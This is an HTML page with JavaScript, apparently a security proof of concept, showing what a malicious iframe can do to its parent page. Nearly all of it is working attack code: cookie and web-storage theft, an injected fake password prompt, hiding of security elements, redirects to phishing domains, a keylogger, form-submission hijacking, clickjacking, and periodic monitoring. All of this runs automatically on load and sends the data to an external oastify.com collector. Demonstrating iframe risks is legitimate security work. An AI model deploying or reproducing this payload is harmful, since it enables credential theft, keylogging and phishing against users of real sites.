<!DOCTYPE html>
<html>
<head>
    <title>Iframe Security PoC</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            padding: 20px; 
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            color: white;
        }
        .exploit { 
            background: rgba(0,0,0,0.8); 
            padding: 15px; 
            margin: 10px 0; 
            border-radius: 8px; 
        }
        button { 
            background: #ff4757; 
            color: white; 
            border: none; 
            padding: 10px 20px; 
            margin: 5px; 
            border-radius: 5px; 
            cursor: pointer; 
        }
        #results { 
            background: rgba(0,0,0,0.9); 
            padding: 15px; 
            margin-top: 20px; 
            border-radius: 8px; 
            max-height: 300px; 
            overflow-y: auto; 
        }
    </style>
</head>
<body>
    <h1>üö® Iframe Security Exploitation PoC</h1>
    <p>This demonstrates what malicious iframe content can do without proper sandboxing:</p>

    <div class="exploit">
        <h3>1. Data Theft</h3>
        <button onclick="stealCookies()">Steal All Cookies</button>
        <button onclick="stealLocalStorage()">Steal localStorage</button>
        <button onclick="stealSessionStorage()">Steal sessionStorage</button>
    </div>

    <div class="exploit">
        <h3>2. DOM Manipulation</h3>
        <button onclick="manipulateParent()">Modify Parent Page</button>
        <button onclick="injectContent()">Inject Malicious Content</button>
        <button onclick="hideElements()">Hide Security Elements</button>
    </div>

    <div class="exploit">
        <h3>3. Navigation Attacks</h3>
        <button onclick="redirectParent()">Redirect Parent Window</button>
        <button onclick="openPhishingSite()">Open Phishing Site</button>
    </div>

    <div class="exploit">
        <h3>4. Advanced Attacks</h3>
        <button onclick="keystrokeLogger()">Start Keylogger</button>
        <button onclick="formHijacking()">Hijack Forms</button>
        <button onclick="clickjacking()">Setup Clickjacking</button>
    </div>

    <div class="exploit">
        <h3>5. Continuous Monitoring</h3>
        <button onclick="startMonitoring()">Start Continuous Data Theft</button>
        <button onclick="stopMonitoring()">Stop Monitoring</button>
    </div>

    <div id="results">
        <h4>Exploitation Results:</h4>
        <div id="output"></div>
    </div>

    <script>
        let monitoringInterval;
        
        function log(message) {
            const output = document.getElementById('output');
            output.innerHTML += `<div style="margin: 5px 0; color: #ff6b6b;">[${new Date().toLocaleTimeString()}] ${message}</div>`;
            output.scrollTop = output.scrollHeight;
        }

        // 1. Data Theft Exploits
        function stealCookies() {
            try {
                const cookies = document.cookie || parent.document.cookie;
                log(`üç™ Cookies Stolen: ${cookies}`);
                // Send to attacker server
                exfiltrateData('cookies', cookies);
            } catch(e) {
                log(`‚ùå Cookie theft blocked: ${e.message}`);
            }
        }

        function stealLocalStorage() {
            try {
                const storage = JSON.stringify(localStorage) || JSON.stringify(parent.localStorage);
                log(`üíæ localStorage Stolen: ${storage}`);
                exfiltrateData('localStorage', storage);
            } catch(e) {
                log(`‚ùå localStorage theft blocked: ${e.message}`);
            }
        }

        function stealSessionStorage() {
            try {
                const storage = JSON.stringify(sessionStorage) || JSON.stringify(parent.sessionStorage);
                log(`üîí sessionStorage Stolen: ${storage}`);
                exfiltrateData('sessionStorage', storage);
            } catch(e) {
                log(`‚ùå sessionStorage theft blocked: ${e.message}`);
            }
        }

        // 2. DOM Manipulation
        function manipulateParent() {
            try {
                if (parent.document) {
                    parent.document.body.style.background = 'red';
                    parent.document.body.innerHTML = '<h1 style="color:white;text-align:center;padding:50px;">üö® PARENT PAGE COMPROMISED üö®</h1>' + parent.document.body.innerHTML;
                    log('‚úÖ Parent DOM successfully manipulated');
                } else {
                    log('‚ùå Cannot access parent DOM');
                }
            } catch(e) {
                log(`‚ùå Parent manipulation blocked: ${e.message}`);
            }
        }

        function injectContent() {
            try {
                if (parent.document) {
                    const maliciousDiv = parent.document.createElement('div');
                    maliciousDiv.innerHTML = `
                        <div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:20px;z-index:9999;text-align:center;">
                            üö® SECURITY BREACH DETECTED - ENTER CREDENTIALS TO SECURE ACCOUNT üö®
                            <input type="password" placeholder="Enter password" style="margin-left:10px;">
                            <button>Secure Now</button>
                        </div>
                    `;
                    parent.document.body.appendChild(maliciousDiv);
                    log('‚úÖ Malicious content injected into parent');
                }
            } catch(e) {
                log(`‚ùå Content injection blocked: ${e.message}`);
            }
        }

        function hideElements() {
            try {
                if (parent.document) {
                    // Hide security indicators, logout buttons, etc.
                    const elements = parent.document.querySelectorAll('nav, .logout, .security, [class*="security"]');
                    elements.forEach(el => el.style.display = 'none');
                    log(`‚úÖ Hidden ${elements.length} security elements`);
                }
            } catch(e) {
                log(`‚ùå Element hiding blocked: ${e.message}`);
            }
        }

        // 3. Navigation Attacks
        function redirectParent() {
            try {
                parent.location.href = 'https://evil-phishing-site.com/login';
                log('‚úÖ Parent redirected to malicious site');
            } catch(e) {
                log(`‚ùå Redirect blocked: ${e.message}`);
            }
        }

        function openPhishingSite() {
            try {
                parent.open('https://accounts-google.com.evil.com/login', '_blank');
                log('‚úÖ Phishing site opened in new tab');
            } catch(e) {
                log(`‚ùå Phishing site blocked: ${e.message}`);
            }
        }

        // 4. Advanced Attacks
        function keystrokeLogger() {
            try {
                if (parent.document) {
                    parent.document.addEventListener('keydown', function(e) {
                        log(`‚å®Ô∏è Keystroke: ${e.key}`);
                        exfiltrateData('keystroke', e.key);
                    });
                    log('‚úÖ Keylogger activated on parent page');
                }
            } catch(e) {
                log(`‚ùå Keylogger blocked: ${e.message}`);
            }
        }

        function formHijacking() {
            try {
                if (parent.document) {
                    const forms = parent.document.querySelectorAll('form');
                    forms.forEach(form => {
                        form.addEventListener('submit', function(e) {
                            const formData = new FormData(form);
                            const data = Object.fromEntries(formData);
                            log(`üìù Form data intercepted: ${JSON.stringify(data)}`);
                            exfiltrateData('formData', data);
                        });
                    });
                    log(`‚úÖ Hijacked ${forms.length} forms`);
                }
            } catch(e) {
                log(`‚ùå Form hijacking blocked: ${e.message}`);
            }
        }

        function clickjacking() {
            try {
                if (parent.document) {
                    const overlay = parent.document.createElement('div');
                    overlay.style.cssText = `
                        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                        background: transparent; z-index: 10000; cursor: pointer;
                    `;
                    overlay.onclick = () => {
                        log('üñ±Ô∏è Clickjacking successful - user clicked invisible overlay');
                        // Perform malicious action
                        exfiltrateData('click', 'User clicked hijacked area');
                    };
                    parent.document.body.appendChild(overlay);
                    log('‚úÖ Clickjacking overlay deployed');
                }
            } catch(e) {
                log(`‚ùå Clickjacking blocked: ${e.message}`);
            }
        }

        // 5. Continuous Monitoring
        function startMonitoring() {
            monitoringInterval = setInterval(() => {
                try {
                    const data = {
                        url: parent.location.href,
                        title: parent.document.title,
                        cookies: parent.document.cookie,
                        timestamp: new Date().toISOString()
                    };
                    log(`üì° Monitoring data: ${JSON.stringify(data)}`);
                    exfiltrateData('monitoring', data);
                } catch(e) {
                    log(`‚ùå Monitoring attempt blocked: ${e.message}`);
                }
            }, 5000);
            log('‚úÖ Continuous monitoring started');
        }

        function stopMonitoring() {
            if (monitoringInterval) {
                clearInterval(monitoringInterval);
                log('üõë Monitoring stopped');
            }
        }

        // Data exfiltration function
        function exfiltrateData(type, data) {
            // In a real attack, this would send to attacker's server
            try {
                fetch('https://nc36g8i3nr0nads2q54byor4ovumif64.oastify.com/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type, data, timestamp: new Date() })
                }).catch(() => {
                    log(`üì° Data exfiltration simulated: ${type}`);
                });
            } catch(e) {
                log(`üì° Data exfiltration simulated: ${type}`);
            }
        }

        // Auto-run some exploits on load
        window.onload = function() {
            log('üöÄ Malicious iframe loaded and executing...');
            
            // Try immediate data theft
            setTimeout(() => {
                stealCookies();
                stealLocalStorage();
            }, 1000);

            // Start monitoring
            setTimeout(() => {
                startMonitoring();
            }, 2000);
        };
    </script>
</body>
</html>
